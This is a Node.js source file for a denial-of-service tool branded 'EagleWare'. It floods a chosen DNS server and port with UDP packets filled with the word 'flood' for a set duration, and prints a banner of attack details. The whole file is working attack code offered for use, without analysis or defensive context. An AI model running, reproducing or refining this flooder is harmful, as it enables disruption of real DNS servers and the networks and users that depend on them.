const dgram = require('dgram');
const process = require('process');

const [,, dnsServer, port, size, duration] = process.argv;

const client = dgram.createSocket('udp4');

const endtime = Date.now() + (duration ? duration * 1000 : 100000);
const packetSize = size ? parseInt(size) : Math.floor(Math.random() * (1500 - 64)) + 64;
const targetPort = port ? parseInt(port) : 53; 

const centerText = (text, width) => {
    const padding = Math.max(0, Math.floor((width - text.length) / 2));
    return ' '.repeat(padding) + text;
};

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(centerText("EagleWare Attack Details", width));
    console.log(centerText("╔════════════════════════════════════════╗", width));
    console.log(centerText(` DNS Server: ${dnsServer}`, width));
    console.log(centerText(` Port: ${targetPort}`, width));
    console.log(centerText(` Size: ${packetSize} bytes`, width));
    console.log(centerText(` Duration: ${duration} seconds`, width));
    console.log(centerText(` Method: DNS Flood`, width));
    console.log(centerText(` This Method Is Under Development!`, width));
    console.log(centerText("╚════════════════════════════════════════╝", width));
    console.log(centerText("Reset your network if internet doesn't work", width));
};

printAttackDetails();

let packetCount = 0;

const sendPackets = () => {
    if (Date.now() > endtime) {
        console.log(`Total packets sent: ${packetCount}`);
        client.close();
        return;
    }

    const message = Buffer.alloc(packetSize, 'flood');
    client.send(message, targetPort, dnsServer, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
            client.close();
        } else {
            packetCount++;
            setImmediate(sendPackets);
        }
    });
};

sendPackets();